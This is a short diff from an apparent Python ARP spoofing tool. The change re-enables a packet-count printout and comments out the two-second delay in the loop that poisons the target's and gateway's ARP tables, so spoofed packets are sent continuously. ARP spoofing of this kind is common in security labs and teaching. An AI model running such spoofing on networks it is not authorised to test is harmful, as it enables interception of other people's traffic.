@@ -43,9 +43,9 @@ class ARP:
                 self.spoof(target_ip, gateway_ip)
                 self.spoof(gateway_ip, target_ip)
                 sent_packets_count = sent_packets_count + 2
-                # print("\r[+] Packets sent: " + str(sent_packets_count), )
+                print("\r[+] Packets sent: " + str(sent_packets_count), )
                 sys.stdout.flush()
-                time.sleep(2)
+                # time.sleep(2)
         except KeyboardInterrupt:
             # print("\n[+] Detected CTRL+C ...... Quitting")
             self.restore(target_ip, gateway_ip)
